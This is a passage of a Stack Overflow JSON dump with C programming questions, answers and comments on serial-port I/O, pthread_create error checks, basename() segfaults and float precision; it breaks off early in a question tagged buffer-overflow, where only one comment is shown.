tty.c_iflag &amp;= ~OPOST;\n\n    if (tcsetattr(fd, TCSANOW, &amp;tty) != 0) {\n        printf(\"Error from tcsetattr: %s\\n\", strerror(errno));\n        return -1;\n    }\n\n    return 0;\n}\n\nvoid\nwrite_serial (int fd, const char *buf, int len)\n{\n    printf(\"WRITE: %s\\n\", buf);\n    write(fd, buf, len);\n}\n\nvoid\nread_serial (int fd, char *buf, int len)\n{\n    ssize_t nread = read(fd, buf, len);\n    if (nread &gt; 0 &amp;&amp; nread &lt;= len) {\n      buf[nread] = 0;\n      printf(\" READ: %s\\n\", buf);\n    }\n}\n\nint \nmain (int argc, char **argv)\n{\n    char buf[80];\n    int fd = open(_TTY, O_RDWR | O_NOCTTY);\n\n    if (fd &lt; 0) {\n      fprintf(stderr, \"Can't open %s: %s\\n\", _TTY, strerror(errno));\n      goto exit;\n    }\n\n    if (set_interface_attribs(fd, B115200) &lt; 0) {\n      goto exit;\n    }\n\n#ifdef DEVICE\n    printf(\"device: %s\\n\", _TTY);\n    write_serial(fd, \"d\\n\", 2);\n    usleep((2 + 25) * 100);\n    read_serial(fd, buf, 2);\n#else\n    printf(\"host: %s\\n\", _TTY);\n    read_serial(fd, buf, 2);\n    //usleep((2 + 25) * 100);\n    write_serial(fd, \"h\\n\", 2);\n#endif\n\n    close(fd);\nexit:\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "pthreads", "pthread-join"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1482947535, "post_id": 41367103, "comment_id": 69935856, "body": "I don&#39;t understand the nature of your confusion.  Like many C library functions, <code>pthread_create()</code> returns 0 on success.  This is <a href=\"http://pubs.opengroup.org/onlinepubs/7908799/xsh/pthread_create.html\" rel=\"nofollow noreferrer\">well documented</a>.  You treat that instead as an error, and you <i>know</i> you&#39;re treating it as an error because the message you emit tells you so."}], "answers": [{"tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": true, "score": 6, "last_activity_date": 1482947080, "creation_date": 1482947080, "answer_id": 41367136, "question_id": 41367103, "link": "https://stackoverflow.com/questions/41367103/parallel-programming-using-pthreads/41367136#41367136", "title": "Parallel programming using Pthreads", "body": "<blockquote>\n  <p>On success, pthread_create() returns 0</p>\n</blockquote>\n\n<p>so the thread runs, it's just that the error code check should be done like the other way round:</p>\n\n<pre><code>if(flag != 0){\n    printf(\"ERROR; return code from pthread_create() is %d\\n\", flag);\n    exit(-1);\n}\n</code></pre>\n"}], "owner": {"reputation": 304, "user_id": 5959470, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/0764aae9caf482def8f15a66f22234d0?s=128&d=identicon&r=PG&f=1", "display_name": "Abhijeet Mohanty", "link": "https://stackoverflow.com/users/5959470/abhijeet-mohanty"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 875, "favorite_count": 0, "accepted_answer_id": 41367136, "answer_count": 1, "score": 1, "last_activity_date": 1482947080, "creation_date": 1482946941, "question_id": 41367103, "link": "https://stackoverflow.com/questions/41367103/parallel-programming-using-pthreads", "title": "Parallel programming using Pthreads", "body": "<p>I am new in the domain of parallel programming so I decided to fiddle around with the pthread_join() sub routine. I came up with the following code to compute a*X + Y where a is a scalar and X, Y are vectors of some size.</p>\n\n<p>Here is what I have written : </p>\n\n<pre><code>    #include &lt;pthread.h&gt;\n    #include &lt;math.h&gt;\n    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n    #define NUM_THREADS 4\n    #define VECTOR_SIZE 65\n\n    struct DAXPYdata\n    {\n      /* data */\n      long a;\n      long X[VECTOR_SIZE];\n      long Y[VECTOR_SIZE];\n    };\n\n    struct DAXPYdata daxpystr;\n    void *calcDAXPY(void *);\n\n    int main(int argc, char *argv[])\n    {\n       int vec_index;\n\n       /*Initialize vectors X and Y an scalar a*/\n       daxpystr.a = 57;\n\n    for(vec_index = 0 ; vec_index &lt; 65 ; vec_index++){\n        daxpystr.X[vec_index] = vec_index + 1;\n        daxpystr.Y[vec_index] = vec_index + 2;\n    }\n\n    pthread_t call_thread[NUM_THREADS];\n    pthread_attr_t attr;\n    int flag;\n    long i;\n    void *status;\n\n    pthread_attr_init(&amp;attr);\n    pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);\n\n    for(i = 0;i &lt; NUM_THREADS;i++){\n        printf(\"In main() : Creating thread %ld \\n\", i);\n        flag = pthread_create(&amp;(call_thread[i]), &amp;attr, calcDAXPY, (void *)i);\n        if(flag == 0){\n            printf(\"ERROR; return code from pthread_create() is %d\\n\", flag);\n            exit(-1);\n        }\n    }   \n\n    pthread_attr_destroy(&amp;attr);\n    for(i = 0; i &lt; NUM_THREADS ; i++) {\n       flag = pthread_join(call_thread[i], &amp;status);\n       if (flag) {\n          printf(\"ERROR; return code from pthread_join() is %d\\n\", flag);\n          exit(-1);\n          }\n\n       printf(\"main(): Completed join with thread %ld having a status of %ld\\n\", i, (long)status );\n    }\n    /* code */\n    printf(\"main(): Program completed, exiting!\\n\");\n    pthread_exit(NULL);\n}\n\nvoid *calcDAXPY(void *thread_id)\n{\n    int i;\n    long tid;\n\n    tid = (long)thread_id;\n\n    printf(\"Thread %ld starting execution\\n\", tid);\n    for(i = 0 ; i &lt; VECTOR_SIZE ; i++){\n        daxpystr.X[i] = daxpystr.a*daxpystr.X[i] + daxpystr.Y[i];\n    }\n\n    printf(\"Result of a*X + Y : \");\n    for (i = 0; i &lt; VECTOR_SIZE ; i++)\n    {\n        printf(\"%ld \", daxpystr.X[i]);\n    }\n    pthread_exit((void *)thread_id);\n}\n</code></pre>\n\n<p>The above code throws up an error on pthread_create() subroutine thereby resulting in a single thread execution. Below is the output</p>\n\n<pre><code>In main() : Creating thread 0 \nERROR; return code from pthread_create() is 0\nThread 0 starting execution\nResult of a*X + Y : 59 117 175 233 291 349 407 465 523 581 639 697 755 813 871 929 987 1045 1103 1161 1219 1277 1335 1393 1451 1509 1567 1625 1683 1741 1799 1857 1915 1973 2031 2089 2147 2205 2263 2321 2379 2437 2495 2553 2611 2669 2727 2785 2843 2901 2959 3017 3075 3133 3191 3249 3307 3365 3423 3481 3539 3597 3655 3713 3771 logout\nSaving session...\n...copying shared history...\n...saving history...truncating history files...\n...completed.\n\n[Process completed]\n</code></pre>\n\n<p>Any ideas on how to sort this out?</p>\n"}, {"tags": ["c", "pointers", "strcmp"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482946863, "post_id": 41367050, "comment_id": 69935540, "body": "So can you trim your code to the failing case only?"}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482946995, "post_id": 41367050, "comment_id": 69935603, "body": "yes! All the lines where the buffer and basename happens go in segmentation fault. I put in the code all the tests just to have all the scenarios. If you comment the lines with &quot;buffer&quot; and &quot;basename&quot; everything works fine. As soon as you decomment even one of them (doesn&#39;t matter which) the segmentation fault happen. I&#39;m really puzzled"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1482947073, "post_id": 41367050, "comment_id": 69935644, "body": "From <code>man basename</code>: &quot;<i>Both dirname() and basename() may modify the contents of path, so it may be desirable to pass a copy when calling one of these functions.</i>&quot;. So you should not pass a string literal to it in the first place."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482947316, "post_id": 41367050, "comment_id": 69935750, "body": "@EugeneSh.  Ok, but the tests say just the opposite: if I use a constant string, it works; if I use an heap pointer, it works too; BUT if I use a heap buffer, it doesn&#39;t work anymore. Why? I read that documentation... after debugging basename returns the address of the first character representing the basename itself."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482947566, "post_id": 41367050, "comment_id": 69935874, "body": "As noted below - you can&#39;t reason about <i>undefined behavior</i>. Once you have one, anything can happen."}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1482947858, "post_id": 41367050, "comment_id": 69936018, "body": "<code>free(p)</code> is missing a semicolon.  Your program seems to work for me with and without the lines causing undefined behavior.  <a href=\"http://ideone.com/v7Q2PS\" rel=\"nofollow noreferrer\">ideone.com/v7Q2PS</a>  What version of gcc are you using?"}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1482948067, "post_id": 41367050, "comment_id": 69936135, "body": "As I&#39;m saying below, removing the call where I feed basename with a constant string does perfectly nothing: the segmentation fault still happens (but only if use a buffer). @Retired Ninja: thanks. I copied my code wrongly"}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1482948384, "post_id": 41367050, "comment_id": 69936288, "body": "@Retired Ninja: at the moment &quot;gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1482948579, "post_id": 41367050, "comment_id": 69936388, "body": "@Retired Ninja: ok, just compiled and execute your code on my machine: it goes into segmentation fault. Here&#39;s the compiation and the execution output: [link] (<a href=\"http://pastebin.com/8ifx6m3v\" rel=\"nofollow noreferrer\">pastebin.com/8ifx6m3v</a>)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1482950156, "post_id": 41367050, "comment_id": 69937141, "body": "@Koldar See latest comment under my answer. Add header files."}], "answers": [{"comments": [{"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482947134, "post_id": 41367119, "comment_id": 69935668, "body": "ok, but then the behaviour is even more weird: with a constant string it shouldn&#39;t work but the tests say otherwise. But if I use a variable buffer (according to the documentation it should work) basename goes in segmentation fault. Basically it behaves in the exact opposite manner!"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482947490, "post_id": 41367119, "comment_id": 69935836, "body": "@Koldar Please read the linked article, once a UB, always a UB. You cannot expect any <i>part</i> of program to behave reasonable once your program hits UB."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482947943, "post_id": 41367119, "comment_id": 69936069, "body": "@Sourav Ghosh OK, I can agree with you that if the program executes an operation that leads to an undefined behaviour, all the next instructions may lead to an undefined behaviour as well. For that reason I explicitly removed the test where I fed basename with a constant string. With your logic the buffer should work now... but it is not! If you can, try it yourself, I&#39;m not crazy, my mom tested me :)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482950016, "post_id": 41367119, "comment_id": 69937075, "body": "@Koldar I really don;t see any problem apart from that. Can you please double-check?"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482950125, "post_id": 41367119, "comment_id": 69937123, "body": "@Koldar <b><i>Please include <code>#include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;libgen.h&gt;</code></i></b>."}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "edited": false, "score": 0, "creation_date": 1482950358, "post_id": 41367119, "comment_id": 69937247, "body": "Incredible... I forgot to add &lt;libgen.h&gt;. Adding it solved the trouble. I thought being a system library I could avoid it but apparently omitting it creates unknown behaviour.... I&#39;m shocked to realize this. Make an answer and I&#39;ll accept it"}, {"owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1482950800, "post_id": 41367119, "comment_id": 69937467, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/131738/discussion-between-koldar-and-sourav-ghosh\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 5, "last_activity_date": 1482950471, "last_edit_date": 1482950471, "creation_date": 1482947021, "answer_id": 41367119, "question_id": 41367050, "link": "https://stackoverflow.com/questions/41367050/basename-on-buffer-goes-into-segmentation-fault/41367119#41367119", "title": "basename on buffer goes into segmentation fault", "body": "<p>According to the <a href=\"https://linux.die.net/man/3/basename\" rel=\"nofollow noreferrer\">man page</a>,</p>\n\n<blockquote>\n  <h3>Bugs</h3>\n  \n  <p>In the glibc implementation of the POSIX versions of these functions they modify their argument, and segfault when called with a static string like <code>\"/usr/\"</code>. [...]</p>\n</blockquote>\n\n<p>Basically, </p>\n\n<pre><code> basename(\"../src/test/resources/constraints_0020_000\")\n</code></pre>\n\n<p>invokes invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a> as this is an attempt to modify the string literal.</p>\n\n<hr>\n\n<p>Note: As mentioned in the man page, there's a change of words needed. Read it like,</p>\n\n<blockquote>\n  <p><em>In the glibc implementation of the POSIX versions of these functions they modify their argument, and <strong>invokes undefined behavior</strong> when called with a static string like <code>\"/usr/\"</code>. [...]</em></p>\n</blockquote>\n\n<p>A segmentation fault is one of the side effects of UB, but not the only one. </p>\n\n<p>FWIW, attempt to modify a string literal itself invokes the UB. Quoting <code>C11</code>, chapter \u00a76.4.5, <em>String literals</em></p>\n\n<blockquote>\n  <p>[...] If the program attempts to modify such an array, the behavior is\n  undefined.</p>\n</blockquote>\n\n<hr>\n\n<p>EDIT:</p>\n\n<p>As discussed in follow up comments, an additional problem was missing header file. You need to have</p>\n\n<pre><code>  #include &lt;libgen.h&gt;\n</code></pre>\n\n<p>added so as to get the forward declaration of the function <code>basename()</code> available.</p>\n"}, {"tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 0, "last_activity_date": 1482947135, "creation_date": 1482947135, "answer_id": 41367148, "question_id": 41367050, "link": "https://stackoverflow.com/questions/41367050/basename-on-buffer-goes-into-segmentation-fault/41367148#41367148", "title": "basename on buffer goes into segmentation fault", "body": "<p>Per <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/basename.html\" rel=\"nofollow noreferrer\">the POSIX standard</a>:</p>\n\n<blockquote>\n  <p>The <code>basename()</code> function may modify the string pointed to by <code>path</code>,\n  and may return a pointer to internal storage. The returned pointer\n  might be invalidated or the storage might be overwritten by a\n  subsequent call to <code>basename()</code>. The returned pointer might also be\n  invalidated if the calling thread is terminated.</p>\n</blockquote>\n\n<p>Per <a href=\"http://man7.org/linux/man-pages/man3/basename.3.html\" rel=\"nofollow noreferrer\">the Linux man page</a>:</p>\n\n<blockquote>\n  <p>Both <strong>dirname()</strong> and <strong>basename()</strong> may modify the contents of\n  <code>path</code>, so it may be desirable to pass a copy when calling one of\n  these functions.</p>\n</blockquote>\n\n<p>You're calling <code>basename()</code> with a static string, which is likely read-only, thus causing a SEGV when <code>basename()</code> attempts to modify the string.</p>\n"}], "owner": {"reputation": 1109, "user_id": 1887602, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/5520b4adf006e9c93ccbcca0036b4e94?s=128&d=identicon&r=PG&f=1", "display_name": "Koldar", "link": "https://stackoverflow.com/users/1887602/koldar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 499, "favorite_count": 0, "accepted_answer_id": 41367119, "answer_count": 2, "score": 1, "last_activity_date": 1482950471, "creation_date": 1482946701, "last_edit_date": 1482948089, "question_id": 41367050, "link": "https://stackoverflow.com/questions/41367050/basename-on-buffer-goes-into-segmentation-fault", "title": "basename on buffer goes into segmentation fault", "body": "<p>I'm tweaking with <code>basename</code> right now and I encounter a case really weird (at least for me). Here's the code:</p>\n\n<pre><code>char buffer[300];\nchar* p;\n\nstrcpy(buffer, \"../src/test/resources/constraints_0020_000\");\nprintf(\"%d\\n\", strcmp(basename(\"../src/test/resources/constraints_0020_000\"), \"constraints_0020_000\")); //works as expected\nprintf(\"assert testBasename02\");\nprintf(\"%d\\n\", strcmp(basename(buffer), \"constraints_0020_000\") == 0);\nprintf(\"done 1\\n\"); //goes in segmentation fault\nprintf(\"%d\\n\", strcmp(basename(&amp;buffer), \"constraints_0020_000\") == 0);\nprintf(\"done 2\\n\"); //goes in segmentation fault\nprintf(\"%d\\n\", strcmp(basename(&amp;buffer[0]), \"constraints_0020_000\") == 0);\nprintf(\"done 3\\n\"); //goes in segmentation fault\np = malloc(strlen(\"../src/test/resources/constraints_0020_000\") +1);\nstrcpy(p, \"../src/test/resources/constraints_0020_000\");\nprintf(\"%d\\n\", strcmp(basename(p), \"constraints_0020_000\") == 0); //works as expected\nfree(p);\nprintf(\"all done\\n\");\n</code></pre>\n\n<p>The first <code>strcmp</code> works totally as excepted; it is the second one that puzzles me: why a buffer would go in segmentation fault? I tried to code the buffer all in different ways but the result is the same.</p>\n\n<p>I can of course live with this behaviour but... I don't really understand what is the difference for <code>basename</code> if i feed him a <code>const char*</code> or a buffer (that in the end is also a <code>char*</code>).</p>\n\n<p>Is there a document that explain this behaviour? Is it just me? I tried to look for explanations but I couldn't find any.</p>\n\n<p>Here the specification of my computer (if you need them):</p>\n\n<ul>\n<li>OS system: Ubuntu 16.4 (64 bit virtualized on Windows 10 64-bit);</li>\n<li>CPU (not that I think is useful): Intel\u00ae Core\u2122 i5-3230M CPU @ 2.60GHz \u00d7 2;</li>\n</ul>\n"}, {"tags": ["c", "floating-point"], "comments": [{"owner": {"reputation": 3402, "user_id": 1841533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a9c40aae4572d0d306ac3fbcc6ac9d9?s=128&d=identicon&r=PG", "display_name": "Olivier Dulac", "link": "https://stackoverflow.com/users/1841533/olivier-dulac"}, "edited": false, "score": 0, "creation_date": 1482945068, "post_id": 41366376, "comment_id": 69934717, "body": "You will need bignums library of an equivalent of it , and the appropriate types."}, {"owner": {"reputation": 19428, "user_id": 581076, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/KQGy0.png?s=128&g=1", "display_name": "tymtam", "link": "https://stackoverflow.com/users/581076/tymtam"}, "edited": false, "score": 0, "creation_date": 1545087354, "post_id": 41366376, "comment_id": 94497233, "body": "It will be 999999999 if you use <code>decimal</code>."}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 7093904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc090428226a661157c94b0abbe93466?s=128&d=identicon&r=PG&f=1", "display_name": "zhaoguangliang", "link": "https://stackoverflow.com/users/7093904/zhaoguangliang"}, "edited": false, "score": 0, "creation_date": 1483410927, "post_id": 41366493, "comment_id": 70077228, "body": "Thanks for your answer,but i don&#39;t know the mens about &quot;Typical float can represent exactly about 232 different numbers like 1234.0 and -0.125. 999999999 is not one of them. &quot;, can you show me more about it ?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 71, "user_id": 7093904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc090428226a661157c94b0abbe93466?s=128&d=identicon&r=PG&f=1", "display_name": "zhaoguangliang", "link": "https://stackoverflow.com/users/7093904/zhaoguangliang"}, "edited": false, "score": 0, "creation_date": 1483411346, "post_id": 41366493, "comment_id": 70077313, "body": "@zhaoguangliang  <code>float</code> is typically 4 bytes, than is, at most,  4,294,967,296 different floating point numbers.  Yet you can code <code>float number = endless_different_decimal_values_in_text;</code>.  Sometimes code will use a number that is not representable as 1 of those 4 billion.  What do you think should happen then?"}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 8, "last_activity_date": 1482944301, "creation_date": 1482944301, "answer_id": 41366493, "question_id": 41366376, "link": "https://stackoverflow.com/questions/41366376/why-does-my-float-of-999999999-become-10000000000/41366493#41366493", "title": "Why does my float of 999999999 become 10000000000?", "body": "<p><a href=\"https://en.wikipedia.org/wiki/Single-precision_floating-point_format\" rel=\"noreferrer\">Typical <code>float</code></a> can represent exactly about 2<sup>32</sup> different numbers like 1234.0 and -0.125.  <code>999999999</code> is not one of them.  <code>10000000000.0f</code> is the closest <code>float</code> alternative.</p>\n\n<p>The approximation occurred during the assignment</p>\n\n<pre><code>float number = 999999999;  // Really assigned 10000000000.0f\n</code></pre>\n"}], "owner": {"reputation": 71, "user_id": 7093904, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cc090428226a661157c94b0abbe93466?s=128&d=identicon&r=PG&f=1", "display_name": "zhaoguangliang", "link": "https://stackoverflow.com/users/7093904/zhaoguangliang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 340, "favorite_count": 0, "closed_date": 1482968963, "answer_count": 1, "score": 2, "last_activity_date": 1519269366, "creation_date": 1482943878, "last_edit_date": 1482945080, "question_id": 41366376, "link": "https://stackoverflow.com/questions/41366376/why-does-my-float-of-999999999-become-10000000000", "closed_reason": "Duplicate", "title": "Why does my float of 999999999 become 10000000000?", "body": "<p>When I perform the following code, it has a problem:</p>\n\n<pre><code>float number = 999999999;\nprintf(\"%lf\", number);\n</code></pre>\n\n<p>The result is <code>10000000000</code> instead of <code>999999999</code>.</p>\n\n<p>Why isn't it <code>999999999</code>?</p>\n"}, {"tags": ["c", "x86", "segmentation-fault", "buffer-overflow", "exploit"], "comments": [{"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 4, "creation_date": 1482944114, "post_id": 41366299, "comment_id": 69934246, "body": "Can you de-obfuscate the code that you&#39;re trying to execute? My brain is a terrible disassembler; I don&#39;t have the binary-to-mnemonic tables memorized. What does the code look like in memory once you&#39;ve modified it?"}, {"owner": {"reputation": 